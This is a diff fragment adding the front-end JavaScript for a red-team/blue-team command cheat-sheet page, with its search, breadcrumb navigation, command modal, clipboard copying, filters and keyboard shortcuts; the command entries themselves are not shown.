+  vis().forEach(sec=>sec.cmds.forEach(c=>{if((c.t+c.c).toLowerCase().includes(q.toLowerCase()))hits.push({...c,team:sec.team})}));
+  $('hb').textContent=hits.length?`${hits.length} result${hits.length!==1?'s':''}` :'';
+  bc([{l:'Home',cb:()=>go('home')},{l:`Search: "${q}"`}]);
+  if(!hits.length){$('content').innerHTML=`<div class="es"><div class="ei">🔍</div><div class="em">No results for <strong>${eh(q)}</strong><br><br>Try: nmap · mimikatz · ssh · iptables · volatility · hydra</div></div>`;return}
+  $('content').innerHTML=`<div class="srh"><div class="srt">Results</div><div class="src">${hits.length} match${hits.length!==1?'es':''}</div></div><div class="cg">${hits.map(c=>card(c,c.team,q)).join('')}</div>`;
+}
+
+// ── BREADCRUMB ─────────────────────────────────────────────
+function bc(parts){
+  $('crumb').innerHTML=parts.map((p,i)=>{
+    const s=i>0?`<span class="cs"> › </span>`:'';
+    if(i===parts.length-1||!p.cb)return`${s}<span class="cc">${eh(p.l)}</span>`;
+    return`${s}<span class="cl" onclick="(${p.cb})()">${eh(p.l)}</span>`;
+  }).join('');
+}
+
+// ── NAVIGATION ─────────────────────────────────────────────
+function go(id){
+  S.view=id;S.q='';$('srch').value='';$('hb').textContent='';$('content').scrollTop=0;
+  if(id==='home')rHome();else rSec(id);
+  rn();
+}
+
+// ── MODAL ──────────────────────────────────────────────────
+function om(enc2){
+  try{
+    const d=dec(enc2);S.mc=d.c;
+    $('mti').textContent=d.t;
+    const t=$('mteam');
+    t.textContent=d.team==='blue'?'🔵 BLUE TEAM':'🔴 RED TEAM';
+    t.className='mteam '+(d.team==='blue'?'mb2':'mr2');
+    $('mbody').textContent=d.c;
+    const b=$('mcb');b.textContent='[ COPY ]';b.className='btn bcp';
+    $('overlay').classList.add('open');
+  }catch(e){console.error(e)}
+}
+function cm(){$('overlay').classList.remove('open');S.mc=null}
+function oc(e){if(e.target===$('overlay'))cm()}
+function cpm(){if(!S.mc)return;cp(S.mc);const b=$('mcb');b.textContent='✓ COPIED';b.className='btn bcp done'}
+
+// ── COPY ───────────────────────────────────────────────────
+function cp(t){
+  navigator.clipboard?.writeText(t).catch(()=>{const x=document.createElement('textarea');x.value=t;document.body.appendChild(x);x.select();document.execCommand('copy');document.body.removeChild(x)});
+  const toast=$('toast');toast.classList.add('show');setTimeout(()=>toast.classList.remove('show'),1800);
+}
+function dc(e,btn,raw){
+  e.stopPropagation();cp(raw);btn.textContent='✓';btn.classList.add('ok');
+  setTimeout(()=>{btn.textContent='COPY';btn.classList.remove('ok')},1500);
+}
+
+// ── SEARCH ─────────────────────────────────────────────────
+let st;
+$('srch').addEventListener('input',e=>{
+  clearTimeout(st);const q=e.target.value.trim();
+  st=setTimeout(()=>{
+    S.q=q;
+    if(!q){$('hb').textContent='';if(S.view==='search')go('home');else if(S.view!=='home')rSec(S.view);else rHome();}
+    else{S.view='search';rn();rSrch(q);}
+  },180);
+});
+
+// ── FILTERS ────────────────────────────────────────────────
+document.querySelectorAll('.fp').forEach(p=>{
+  p.addEventListener('click',()=>{
+    document.querySelectorAll('.fp').forEach(x=>x.classList.remove('on'));
+    p.classList.add('on');S.filter=p.dataset.f;
+    if(S.q)rSrch(S.q);else if(S.view!=='home')rSec(S.view);else rHome();
+  });
+});
+
+// ── KEYBOARD ───────────────────────────────────────────────
+document.addEventListener('keydown',e=>{
+  if(e.key==='Escape')cm();
+  if((e.ctrlKey||e.metaKey)&&e.key==='k'){e.preventDefault();$('srch').focus();$('srch').select()}
+});
+
+// ── INIT ───────────────────────────────────────────────────
+rn();rHome();
+</script>
+</body>
+</html>
